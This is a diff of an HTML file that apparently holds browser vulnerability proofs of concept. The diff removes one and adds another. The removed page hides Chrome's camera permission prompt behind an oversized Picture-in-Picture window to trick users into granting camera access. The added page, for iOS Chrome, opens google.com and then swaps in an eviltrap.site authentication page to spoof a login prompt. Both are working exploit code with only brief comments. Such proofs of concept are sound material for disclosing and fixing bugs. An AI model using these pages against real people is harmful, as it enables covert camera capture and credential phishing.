@@ -1,57 +1,23 @@
-<!doctype html>
-<html>
-<head>
-<style>
-html { font-family: sans-serif; }
-#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
 
-#wrapper {
-    /* Setting PEPC position directly often leads to renderer crashes :( */
-    position: absolute;
-    bottom: 0;
-    right: 0px;
-}
-#permElem {
-    /* Try to hide the PEPC prompt as much as possible */
-    width: fit-content;
-    height: 1px;
-    font-size: 11px;
-    outline: none;
-    background: #fff;
-    color: #888;
-}
-</style>
-</head>
-<body>
-<h1>PoC: PEPC prompt obscured by Document PiP window</h1>
-<p>Also works with Video PiP, but since <code>PictureInPictureOcclusionTracker</code> will track both, only using Document PiP for this PoC.</p>
-<p id="instructions">Press tab, then enter</p>
-<div id="wrapper">
-    <permission id="permElem" type="camera">
-</div>
-<script>
-// Interestingly, opening PEPC prompt refocuses the page with the prompt,
-// therefore we don't need more user interaction to steal focus from the
-// PiP window after opening it.
-var newWin;
-permElem.addEventListener('keydown', async (e) => {
-    if (e.keyCode == 9) {
-        // Ignore tab key
-        return;
-    }
-    if (newWin && !newWin.closed) { return; }
-    newWin = await documentPictureInPicture.requestWindow({width: 9000, height: 9000, disallowReturnToOpener: true});
-    newWin.document.body.innerHTML = '<style>html { font-family: sans-serif; }</style><h1>Press tab twice, then enter</h1>';
-});
-setInterval(async () => {
-    var permStatus = await navigator.permissions.query({name: 'camera'});
-    if (permStatus.state == 'granted') {
-        instructions.innerText = 'Thank you!';
-        permElem.remove();
-        newWin.close();
-        navigator.mediaDevices.getUserMedia({video: true});
-    }
-}, 500);
-</script>
-</body>
-</html>
+<html>
+                    <head>
+                      <title>HTTP Auth Prompt Spoof IOS chrome (87.0.4280.163) </title>
+                  </head>
+                    <body>
+                      <script>
+                        (() => {
+    const button = document.createElement('button');
+    button.innerText = 'Click Me';
+
+    button.addEventListener('click', async () => {
+      window.open('https://google.com', 'g');
+      setTimeout(() => {
+        window.open('https://eviltrap.site/trap/http-auth-prompt-spoof/auth', 'g');
+      }, 2000);
+    });
+
+    document.body.appendChild(button);
+  })()
+                      </script>
+                    </body>
+                  </html>
